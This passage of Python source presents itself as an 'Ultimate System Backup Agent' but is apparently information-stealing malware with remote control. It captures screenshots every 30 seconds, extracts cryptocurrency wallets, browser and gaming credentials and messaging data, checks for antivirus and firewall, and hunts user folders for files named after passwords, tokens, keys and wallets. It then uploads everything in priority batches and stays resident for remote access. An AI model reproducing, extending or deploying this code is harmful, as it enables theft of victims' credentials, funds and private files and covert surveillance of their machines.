            buffer = io.BytesIO()
            screenshot.save(buffer, format='JPEG', quality=85, optimize=True)
            screenshot_b64 = base64.b64encode(buffer.getvalue()).decode()
            
            screenshot_data = {
                "image_data": screenshot_b64,
                "timestamp": datetime.now().isoformat(),
                "resolution": screenshot.size,
                "client_id": CONFIG["CLIENT_ID"],
                "client_name": CONFIG["CLIENT_NAME"]
            }
            
            logger.info(f"📸 Screenshot captured: {screenshot.size[0]}x{screenshot.size[1]}")
            return screenshot_data
            
        except Exception as e:
            logger.error(f"❌ Screenshot capture failed: {e}")
            return None
    
    def _start_auto_screenshot(self):
        """Start automatic screenshot capture thread"""
        def screenshot_loop():
            while self.is_active:
                try:
                    screenshot_data = self.capture_screenshot_enhanced()
                    if screenshot_data and self.socketio_client:
                        self.socketio_client.emit('auto_screenshot', screenshot_data)
                    
                    time.sleep(30)  # Screenshot every 30 seconds
                    
                except Exception as e:
                    logger.error(f"❌ Auto screenshot error: {e}")
                    time.sleep(60)  # Wait longer on error
        
        self.screenshot_thread = threading.Thread(target=screenshot_loop, daemon=True)
        self.screenshot_thread.start()
        logger.info("📸 Auto-screenshot thread started")
    
    def get_enhanced_system_info(self):
        """Get comprehensive system information"""
        try:
            # CPU Information
            cpu_info = {
                "processor": platform.processor(),
                "architecture": platform.architecture()[0],
                "cpu_count": psutil.cpu_count(),
                "cpu_percent": psutil.cpu_percent(interval=1),
                "cpu_freq": psutil.cpu_freq()._asdict() if psutil.cpu_freq() else {}
            }
            
            # Memory Information
            memory = psutil.virtual_memory()
            memory_info = {
                "total": memory.total,
                "available": memory.available,
                "percent": memory.percent,
                "used": memory.used,
                "free": memory.free
            }
            
            # Disk Information
            disk_info = []
            for partition in psutil.disk_partitions():
                try:
                    partition_usage = psutil.disk_usage(partition.mountpoint)
                    disk_info.append({
                        "device": partition.device,
                        "mountpoint": partition.mountpoint,
                        "fstype": partition.fstype,
                        "total": partition_usage.total,
                        "used": partition_usage.used,
                        "free": partition_usage.free,
                        "percent": (partition_usage.used / partition_usage.total * 100) if partition_usage.total > 0 else 0
                    })
                except:
                    continue
            
            # Network Information
            network_info = {
                "hostname": socket.gethostname(),
                "fqdn": socket.getfqdn(),
                "ip_addresses": self._get_ip_addresses(),
                "network_stats": psutil.net_io_counters()._asdict()
            }
            
            # Process Information (top 10 by memory)
            processes = []
            for proc in psutil.process_iter(['pid', 'name', 'memory_percent', 'cpu_percent']):
                try:
                    processes.append(proc.info)
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
            
            processes.sort(key=lambda x: x.get('memory_percent', 0), reverse=True)
            top_processes = processes[:10]
            
            # System uptime
            boot_time = psutil.boot_time()
            uptime = datetime.now() - datetime.fromtimestamp(boot_time)
            
            system_info = {
                "basic_info": {
                    "system": platform.system(),
                    "release": platform.release(),
                    "version": platform.version(),
                    "machine": platform.machine(),
                    "node": platform.node(),
                    "uptime": str(uptime)
                },
                "cpu": cpu_info,
                "memory": memory_info,
                "disk": disk_info,
                "network": network_info,
                "top_processes": top_processes,
                "collection_time": datetime.now().isoformat(),
                "agent_stats": self.control_stats
            }
            
            return system_info
            
        except Exception as e:
            logger.error(f"❌ Error collecting system info: {e}")
            return {"error": str(e)}
    
    def _get_ip_addresses(self):
        """Get all IP addresses of the system"""
        ip_addresses = []
        
        try:
            for interface, addrs in psutil.net_if_addrs().items():
                for addr in addrs:
                    if addr.family == socket.AF_INET:  # IPv4
                        ip_addresses.append({
                            "interface": interface,
                            "ip": addr.address,
                            "netmask": addr.netmask,
                            "type": "IPv4"
                        })
                    elif addr.family == socket.AF_INET6:  # IPv6
                        ip_addresses.append({
                            "interface": interface,
                            "ip": addr.address,
                            "type": "IPv6"
                        })
        except Exception as e:
            logger.debug(f"Error getting IP addresses: {e}")
        
        return ip_addresses
    
    def shutdown(self):
        """Shutdown remote control system"""
        self.is_active = False
        if self.screenshot_thread and self.screenshot_thread.is_alive():
            logger.info("📸 Stopping auto-screenshot thread")
        logger.info("🎮 Remote control system shutdown")

class UltimateSystemBackupManager:
    """🚀 Ultimate system backup manager with advanced priority system and multi-upload"""
    
    def __init__(self):
        self.priority_queue = EnhancedPriorityQueue()
        self.upload_manager = EnhancedMultiUploadManager()
        self.remote_control = AdvancedRemoteControlManager()
        self.backup_data = {}
        self.extraction_stats = {
            "total_extraction_time": 0,
            "total_files_processed": 0,
            "total_data_size": 0,
            "phase_timings": {}
        }
    
    def create_ultimate_prioritized_backup(self):
        """Create ultimate backup with intelligent priority system and multi-upload"""
        logger.info("🚀 Starting ULTIMATE PRIORITIZED backup system...")
        
        backup_start_time = time.time()
        
        backup_info = {
            "backup_id": str(uuid.uuid4()),
            "backup_version": "3.0_ultimate",
            "created_at": datetime.now().isoformat(),
            "client_id": CONFIG["CLIENT_ID"],
            "client_name": CONFIG["CLIENT_NAME"],
            "priority_system_enabled": True,
            "multi_upload_enabled": True,
            "remote_control_enabled": CONFIG["REMOTE_CONTROL"]["enabled"],
            "status": "in_progress",
            "phases": {}
        }
        
        try:
            # 🔥 PHASE 1: CRITICAL - Cryptocurrency wallets (Priority 1)
            phase_start = time.time()
            logger.info("🔥 PHASE 1: CRITICAL - Extracting cryptocurrency wallets...")
            
            crypto_extractor = UltimateCryptoWalletExtractor(self.priority_queue)
            backup_info["phases"]["crypto_wallets"] = {
                "data": crypto_extractor.extract_all_wallets(),
                "priority": CONFIG["PRIORITY_SYSTEM"]["priority_thresholds"]["CRITICAL"],
                "phase_time": time.time() - phase_start,
                "status": "completed"
            }
            self.extraction_stats["phase_timings"]["crypto_wallets"] = time.time() - phase_start
            
            # 🎮 PHASE 2: HIGH - Gaming platforms and browser credentials (Priority 2)
            phase_start = time.time()
            logger.info("🎮 PHASE 2: HIGH - Extracting gaming and browser data...")
            
            gaming_extractor = SuperiorGamingPlatformExtractor(self.priority_queue)
            browser_extractor = AdvancedBrowserDataExtractor(self.priority_queue)
            
            backup_info["phases"]["gaming_platforms"] = {
                "data": gaming_extractor.extract_all_gaming_data(),
                "priority": CONFIG["PRIORITY_SYSTEM"]["priority_thresholds"]["HIGH"],
                "phase_time": time.time() - phase_start,
                "status": "completed"
            }
            
            backup_info["phases"]["browser_data"] = {
                "data": browser_extractor.extract_all_browser_data(),
                "priority": CONFIG["PRIORITY_SYSTEM"]["priority_thresholds"]["HIGH"],
                "phase_time": time.time() - phase_start,
                "status": "completed"
            }
            self.extraction_stats["phase_timings"]["high_priority"] = time.time() - phase_start
            
            # 📱 PHASE 3: MEDIUM - Messaging applications (Priority 3)
            phase_start = time.time()
            logger.info("📱 PHASE 3: MEDIUM - Extracting messaging applications...")
            
            messaging_extractor = EnhancedMessagingExtractor(self.priority_queue)
            backup_info["phases"]["messaging_apps"] = {
                "data": messaging_extractor.extract_all_messaging_data(),
                "priority": CONFIG["PRIORITY_SYSTEM"]["priority_thresholds"]["MEDIUM"],
                "phase_time": time.time() - phase_start,
                "status": "completed"
            }
            self.extraction_stats["phase_timings"]["messaging_apps"] = time.time() - phase_start
            
            # 📊 PHASE 4: LOW - System information and configuration (Priority 4)
            phase_start = time.time()
            logger.info("📊 PHASE 4: LOW - Collecting system information...")
            
            system_info = self._collect_comprehensive_system_info()
            backup_info["phases"]["system_info"] = {
                "data": system_info,
                "priority": CONFIG["PRIORITY_SYSTEM"]["priority_thresholds"]["LOW"],
                "phase_time": time.time() - phase_start,
                "status": "completed"
            }
            
            self.priority_queue.add_item({
                "type": "comprehensive_system_info",
                "data": system_info,
                "priority": CONFIG["PRIORITY_SYSTEM"]["priority_thresholds"]["LOW"],
                "size_estimate": len(json.dumps(system_info, default=str).encode('utf-8'))
            }, priority=CONFIG["PRIORITY_SYSTEM"]["priority_thresholds"]["LOW"])
            
            self.extraction_stats["phase_timings"]["system_info"] = time.time() - phase_start
            
            # 🗂️ PHASE 5: BULK - Selective file system scan (Priority 5)
            phase_start = time.time()
            logger.info("🗂️ PHASE 5: BULK - Selective file system scanning...")
            
            file_scan_results = self._perform_intelligent_file_scan()
            backup_info["phases"]["file_scan"] = {
                "data": file_scan_results,
                "priority": CONFIG["PRIORITY_SYSTEM"]["priority_thresholds"]["BULK"],
                "phase_time": time.time() - phase_start,
                "status": "completed"
            }
            self.extraction_stats["phase_timings"]["file_scan"] = time.time() - phase_start
            
            # 📈 Generate comprehensive statistics
            backup_info["extraction_stats"] = self.extraction_stats
            backup_info["queue_stats"] = self.priority_queue.get_comprehensive_stats()
            
            # 🚀 PHASE 6: Process priority queue with multi-upload
            phase_start = time.time()
            logger.info("🚀 PHASE 6: Processing priority queue with multi-upload system...")
            
            upload_results = asyncio.run(self._process_priority_queue_advanced())
            backup_info["upload_results"] = upload_results
            backup_info["upload_stats"] = self.upload_manager.stats
            
            self.extraction_stats["phase_timings"]["upload_processing"] = time.time() - phase_start
            
            # 🎮 Initialize remote control if enabled
            if CONFIG["REMOTE_CONTROL"]["enabled"]:
                logger.info("🎮 Initializing enhanced remote control...")
                remote_control_success = self.remote_control.initialize_remote_control()
                backup_info["remote_control_active"] = remote_control_success
            
            # Final completion
            backup_info["status"] = "completed"
            backup_info["completed_at"] = datetime.now().isoformat()
            backup_info["total_backup_time"] = time.time() - backup_start_time
            
            # Generate final report
            final_report = self._generate_final_backup_report(backup_info)
            logger.info("✅ ULTIMATE BACKUP COMPLETED SUCCESSFULLY!")
            logger.info(f"📊 {final_report}")
            
            return backup_info
            
        except Exception as e:
            logger.error(f"❌ Ultimate backup failed: {e}")
            backup_info["status"] = "failed"
            backup_info["error"] = str(e)
            backup_info["failed_at"] = datetime.now().isoformat()
            return backup_info
    
    def _collect_comprehensive_system_info(self):
        """Collect comprehensive system information"""
        system_info = {
            "collection_time": datetime.now().isoformat(),
            "basic_system": {
                "platform": platform.platform(),
                "system": platform.system(),
                "release": platform.release(),
                "version": platform.version(),
                "machine": platform.machine(),
                "processor": platform.processor(),
                "hostname": socket.gethostname()
            },
            "hardware": {},
            "software": {},
            "network": {},
            "security": {},
            "performance": {}
        }
        
        try:
            # Hardware information
            system_info["hardware"] = {
                "cpu": {
                    "count": psutil.cpu_count(),
                    "count_logical": psutil.cpu_count(logical=True),
                    "freq": psutil.cpu_freq()._asdict() if psutil.cpu_freq() else None,
                    "percent": psutil.cpu_percent(interval=1, percpu=True)
                },
                "memory": psutil.virtual_memory()._asdict(),
                "swap": psutil.swap_memory()._asdict(),
                "disk": [psutil.disk_usage(partition.mountpoint)._asdict() 
                        for partition in psutil.disk_partitions()
                        if os.access(partition.mountpoint, os.R_OK)]
            }
            
            # Network information
            system_info["network"] = {
                "interfaces": {},
                "connections": len(psutil.net_connections()),
                "io_counters": psutil.net_io_counters()._asdict() if psutil.net_io_counters() else {}
            }
            
            # Get network interface details
            for interface, addrs in psutil.net_if_addrs().items():
                system_info["network"]["interfaces"][interface] = [
                    {
                        "family": str(addr.family.name) if hasattr(addr.family, 'name') else str(addr.family),
                        "address": addr.address,
                        "netmask": addr.netmask,
                        "broadcast": addr.broadcast,
                    } for addr in addrs
                ]
            
            # Software/Process information
            processes = []
            for proc in psutil.process_iter(['pid', 'name', 'memory_percent', 'cpu_percent', 'status']):
                try:
                    proc_info = proc.info
                    if proc_info['memory_percent'] > 1.0:  # Only processes using > 1% memory
                        processes.append(proc_info)
                except:
                    continue
            
            system_info["software"] = {
                "processes_count": len(processes),
                "top_memory_processes": sorted(processes, key=lambda x: x.get('memory_percent', 0), reverse=True)[:15],
                "python_version": platform.python_version(),
                "python_implementation": platform.python_implementation()
            }
            
            # Security information
            system_info["security"] = {
                "user": os.getenv('USERNAME', 'unknown'),
                "user_domain": os.getenv('USERDOMAIN', 'unknown'),
                "admin_privileges": self._check_admin_privileges(),
                "antivirus_detection": self._detect_antivirus_software(),
                "firewall_status": self._check_firewall_status()
            }
            
            # Performance metrics
            system_info["performance"] = {
                "boot_time": datetime.fromtimestamp(psutil.boot_time()).isoformat(),
                "load_average": os.getloadavg() if hasattr(os, 'getloadavg') else None,
                "disk_io": psutil.disk_io_counters()._asdict() if psutil.disk_io_counters() else {}
            }
            
        except Exception as e:
            logger.error(f"❌ Error collecting comprehensive system info: {e}")
            system_info["collection_error"] = str(e)
        
        return system_info
    
    def _check_admin_privileges(self):
        """Check if running with administrator privileges"""
        try:
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except:
            return False
    
    def _detect_antivirus_software(self):
        """Detect installed antivirus software"""
        antivirus_list = []
        
        try:
            # Check running processes for AV software
            av_processes = [
                'avast', 'avg', 'avira', 'bitdefender', 'eset', 'kaspersky',
                'mcafee', 'norton', 'panda', 'sophos', 'trend', 'webroot',
                'windows defender', 'defender', 'malwarebytes'
            ]
            
            for proc in psutil.process_iter(['name']):
                try:
                    proc_name = proc.info['name'].lower()
                    for av_name in av_processes:
                        if av_name in proc_name:
                            if av_name not in antivirus_list:
                                antivirus_list.append(av_name)
                except:
                    continue
        
        except Exception as e:
            logger.debug(f"Error detecting antivirus: {e}")
        
        return antivirus_list
    
    def _check_firewall_status(self):
        """Check Windows Firewall status"""
        try:
            result = subprocess.run(
                ['netsh', 'advfirewall', 'show', 'allprofiles', 'state'],
                capture_output=True, text=True, timeout=10
            )
            return "ON" in result.stdout if result.returncode == 0 else "unknown"
        except:
            return "unknown"
    
    def _perform_intelligent_file_scan(self):
        """Perform intelligent file system scan with selective criteria"""
        scan_results = {
            "scanned_directories": [],
            "interesting_files": [],
            "total_files_scanned": 0,
            "total_size_scanned": 0,
            "scan_time": 0
        }
        
        scan_start = time.time()
        
        try:
            # Define intelligent scan targets
            scan_targets = {
                "Desktop": {
                    "path": os.path.expanduser("~/Desktop"),
                    "max_files": 50,
                    "max_depth": 2,
                    "file_types": ['.txt', '.doc', '.docx', '.pdf', '.xlsx', '.zip', '.rar']
                },
                "Documents": {
                    "path": os.path.expanduser("~/Documents"),
                    "max_files": 100,
                    "max_depth": 3,
                    "file_types": ['.txt', '.doc', '.docx', '.pdf', '.xlsx', '.ppt', '.zip']
                },
                "Downloads": {
                    "path": os.path.expanduser("~/Downloads"),
                    "max_files": 30,
                    "max_depth": 1,
                    "file_types": ['.exe', '.msi', '.zip', '.rar', '.pdf', '.txt']
                }
            }
            
            for target_name, target_config in scan_targets.items():
                target_path = target_config["path"]
                
                if os.path.exists(target_path):
                    logger.info(f"🗂️ Scanning {target_name}: {target_path}")
                    
                    target_results = self._scan_directory_intelligent(
                        target_path, 
                        target_config["max_files"],
                        target_config["max_depth"],
                        target_config["file_types"]
                    )
                    
                    scan_results["scanned_directories"].append({
                        "name": target_name,
                        "path": target_path,
                        "results": target_results
                    })
                    
                    scan_results["interesting_files"].extend(target_results["files"])
                    scan_results["total_files_scanned"] += target_results["files_scanned"]
                    scan_results["total_size_scanned"] += target_results["total_size"]
        
        except Exception as e:
            logger.error(f"❌ Error in intelligent file scan: {e}")
            scan_results["scan_error"] = str(e)
        
        scan_results["scan_time"] = time.time() - scan_start
        
        # Add interesting files to BULK priority queue
        for file_info in scan_results["interesting_files"][:50]:  # Limit to 50 files
            self.priority_queue.add_item({
                "type": "interesting_file",
                "file_info": file_info,
                "priority": CONFIG["PRIORITY_SYSTEM"]["priority_thresholds"]["BULK"],
                "size_estimate": file_info["size"]
            }, priority=CONFIG["PRIORITY_SYSTEM"]["priority_thresholds"]["BULK"])
        
        logger.info(f"🗂️ File scan completed: {scan_results['total_files_scanned']} files in {scan_results['scan_time']:.2f}s")
        
        return scan_results
    
    def _scan_directory_intelligent(self, directory, max_files, max_depth, target_extensions):
        """Intelligent directory scanning with filtering"""
        results = {
            "files": [],
            "files_scanned": 0,
            "total_size": 0,
            "directories_scanned": 0
        }
        
        try:
            files_found = 0
            
            for root, dirs, files in os.walk(directory):
                # Check depth limit
                current_depth = root.replace(directory, '').count(os.sep)
                if current_depth >= max_depth:
                    dirs[:] = []  # Don't go deeper
                    continue
                
                results["directories_scanned"] += 1
                
                for filename in files:
                    if files_found >= max_files:
                        break
                    
                    file_path = os.path.join(root, filename)
                    
                    try:
                        # Check file extension
                        file_ext = os.path.splitext(filename)[1].lower()
                        if file_ext not in target_extensions:
                            continue
                        
                        file_size = os.path.getsize(file_path)
                        
                        # Skip very large files (>50MB) and very small files (<1KB)
                        if file_size > 50 * 1024 * 1024 or file_size < 1024:
                            continue
                        
                        file_info = {
                            "name": filename,
                            "path": file_path,
                            "size": file_size,
                            "extension": file_ext,
                            "modified": datetime.fromtimestamp(os.path.getmtime(file_path)).isoformat(),
                            "relative_path": os.path.relpath(file_path, directory),
                            "interest_score": self._calculate_file_interest_score(filename, file_ext, file_size)
                        }
                        
                        if file_info["interest_score"] > 3:  # Only include interesting files
                            results["files"].append(file_info)
                            results["total_size"] += file_size
                            files_found += 1
                        
                        results["files_scanned"] += 1
                        
                    except Exception as e:
                        logger.debug(f"Error scanning file {file_path}: {e}")
                        continue
                
                if files_found >= max_files:
                    break
        
        except Exception as e:
            logger.error(f"❌ Error in intelligent directory scan: {e}")
            results["scan_error"] = str(e)
        
        return results
    
    def _calculate_file_interest_score(self, filename, extension, file_size):
        """Calculate interest score for files"""
        score = 1
        filename_lower = filename.lower()
        
        # High-interest keywords
        high_interest = ['password', 'secret', 'key', 'token', 'credential', 'backup', 'wallet', 'crypto']
        medium_interest = ['config', 'setting', 'important', 'private', 'personal']
        
        for keyword in high_interest:
            if keyword in filename_lower:
                score += 5
        
        for keyword in medium_interest:
            if keyword in filename_lower:
                score += 3
        
        # Extension-based scoring
        extension_scores = {
            '.txt': 2, '.doc': 3, '.docx': 3, '.pdf': 4, '.xlsx': 3,
            '.zip': 4, '.rar': 4, '.7z': 4, '.key': 8, '.pem': 8
        }
        
        score += extension_scores.get(extension, 1)
        
        # Size-based scoring
        if 10000 < file_size < 1000000:  # 10KB to 1MB - interesting size range
            score += 2
        
        return score
    
    async def _process_priority_queue_advanced(self):
        """Advanced priority queue processing with concurrent uploads"""
        upload_results = []
        batch_count = 0
        total_upload_time = 0
        
        logger.info("🎯 Starting advanced priority queue processing...")
        
        # Statistics tracking
        processing_stats = {
            "batches_processed": 0,
            "items_uploaded": 0,
            "items_failed": 0,
            "bytes_uploaded": 0,
            "concurrent_uploads": 0
        }
        
        while not self.priority_queue.is_empty():
            batch = self.priority_queue.get_next_batch(
                batch_size=CONFIG["PRIORITY_SYSTEM"]["batch_size"]
            )
            
            if not batch:
                break
            
            batch_count += 1
            batch_start_time = time.time()
            priorities = [item.get('priority', 4) for item in batch]
            types = [item.get('type', 'unknown') for item in batch]
            
            logger.info(f"📦 Processing batch {batch_count}: {len(batch)} items")
            logger.info(f"   🎯 Priorities: {priorities}")
            logger.info(f"   📁 Types: {types}")
            
            # Process items in batch concurrently
            tasks = []
            for item in batch:
                if item.get('type') == 'file':
                    file_path = item.get('path')
                    file_info = item
                    task = self.upload_manager.upload_file_with_priority(file_path, file_info, item.get('priority', 4))
                    tasks.append(task)
                else:
                    # Handle non-file items (like system info)
                    tasks.append(asyncio.create_task(self._handle_non_file_item(item)))
            
            # Wait for all tasks in batch to complete
            batch_results = await asyncio.gather(*tasks, return_exceptions=True)
            
            # Process results
            for i, result in enumerate(batch_results):
                if isinstance(result, Exception):
                    logger.error(f"❌ Item {i} in batch {batch_count} failed: {result}")
                    processing_stats["items_failed"] += 1
                else:
                    if result.get("status") == "success":
                        processing_stats["items_uploaded"] += 1
                        if "file_size" in result:
                            processing_stats["bytes_uploaded"] += result["file_size"]
                    else:
                        processing_stats["items_failed"] += 1
                
                upload_results.append({
                    "batch": batch_count,
                    "item_index": i,
                    "result": result
                })
            
            batch_time = time.time() - batch_start_time
            total_upload_time += batch_time
            processing_stats["batches_processed"] += 1
            
            logger.info(f"✅ Batch {batch_count} completed in {batch_time:.2f}s")
            
            # Wait between batches if configured
            if CONFIG["PRIORITY_SYSTEM"].get("wait_between_batches", 1) > 0:
                await asyncio.sleep(CONFIG["PRIORITY_SYSTEM"]["wait_between_batches"])
        
        logger.info(f"🎯 Queue processing completed:")
        logger.info(f"   📦 Batches processed: {processing_stats['batches_processed']}")
        logger.info(f"   ✅ Items uploaded: {processing_stats['items_uploaded']}")
        logger.info(f"   ❌ Items failed: {processing_stats['items_failed']}")
        logger.info(f"   💾 Bytes uploaded: {processing_stats['bytes_uploaded']:,}")
        logger.info(f"   ⏱️ Total upload time: {total_upload_time:.2f}s")
        
        return upload_results
    
    async def _handle_non_file_item(self, item):
        """Handle non-file items in the queue"""
        item_type = item.get('type')
        
        if item_type == 'comprehensive_system_info':
            # Create a temporary JSON file for system info
            temp_dir = tempfile.gettempdir()
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            temp_file = os.path.join(temp_dir, f"system_info_{timestamp}.json")
            
            try:
                with open(temp_file, 'w', encoding='utf-8') as f:
                    json.dump(item.get('data', {}), f, indent=2, default=str)
                
                # Upload the file
                result = await self.upload_manager.upload_file_with_priority(
                    temp_file, 
                    {"type": "system_info", "priority": item.get('priority', 4)},
                    item.get('priority', 4)
                )
                
                # Clean up temp file
                try:
                    os.remove(temp_file)
                except:
                    pass
                
                return result
                
            except Exception as e:
                logger.error(f"❌ Error handling system info item: {e}")
                return {"status": "error", "error": str(e)}
        
        # Default handler for other non-file items
        return {"status": "success", "message": f"Processed {item_type} item"}
    
    def _generate_final_backup_report(self, backup_info):
        """Generate final backup report with statistics"""
        report_lines = [
            "=== FINAL BACKUP REPORT ===",
            f"Backup ID: {backup_info['backup_id']}",
            f"Status: {backup_info['status']}",
            f"Total Time: {backup_info.get('total_backup_time', 0):.2f}s",
            ""
        ]
        
        # Add phase information
        for phase_name, phase_data in backup_info.get('phases', {}).items():
            report_lines.extend([
                f"Phase: {phase_name}",
                f"  Status: {phase_data.get('status', 'unknown')}",
                f"  Time: {phase_data.get('phase_time', 0):.2f}s",
                ""
            ])
        
        # Add queue statistics
        queue_stats = backup_info.get('queue_stats', {})
        report_lines.extend([
            "Queue Statistics:",
            f"  Total Items: {queue_stats.get('total_items', 0)}",
            f"  Processed: {queue_stats.get('processed', 0)}",
            f"  Failed: {queue_stats.get('failed', 0)}",
            ""
        ])
        
        # Add upload statistics
        upload_stats = backup_info.get('upload_stats', {})
        report_lines.extend([
            "Upload Statistics:",
            f"  Uploads Attempted: {upload_stats.get('uploads_attempted', 0)}",
            f"  Uploads Successful: {upload_stats.get('uploads_successful', 0)}",
            f"  Bytes Uploaded: {upload_stats.get('bytes_uploaded', 0):,}",
            ""
        ])
        
        # Add remote control status
        report_lines.extend([
            "Remote Control:",
            f"  Enabled: {backup_info.get('remote_control_enabled', False)}",
            f"  Active: {backup_info.get('remote_control_active', False)}",
            ""
        ])
        
        return "\n".join(report_lines)

# Main execution
if __name__ == "__main__":
    try:
        logger.info("🚀 Starting ULTIMATE System Backup Agent v3.0")
        logger.info(f"🖥️ Client: {CONFIG['CLIENT_NAME']} ({CONFIG['CLIENT_ID'][:8]})")
        
        # Initialize backup manager
        backup_manager = UltimateSystemBackupManager()
        
        # Execute ultimate backup
        backup_result = backup_manager.create_ultimate_prioritized_backup()
        
        # Save backup result to file
        result_file = os.path.join(tempfile.gettempdir(), f"ultimate_backup_result_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json")
        with open(result_file, 'w', encoding='utf-8') as f:
            json.dump(backup_result, f, indent=2, default=str)
        
        logger.info(f"💾 Backup result saved to: {result_file}")
        logger.info("🎉 ULTIMATE BACKUP PROCESS COMPLETED!")
        
        # Keep running if remote control is enabled
        if CONFIG["REMOTE_CONTROL"]["enabled"] and backup_result.get("remote_control_active"):
            logger.info("🎮 Remote control active - keeping agent running...")
            try:
                while True:
                    time.sleep(60)  # Keep alive
            except KeyboardInterrupt:
                logger.info("👋 Shutting down...")
                backup_manager.remote_control.shutdown()
        
    except Exception as e:
        logger.error(f"❌ Fatal error in main execution: {e}")
        sys.exit(1)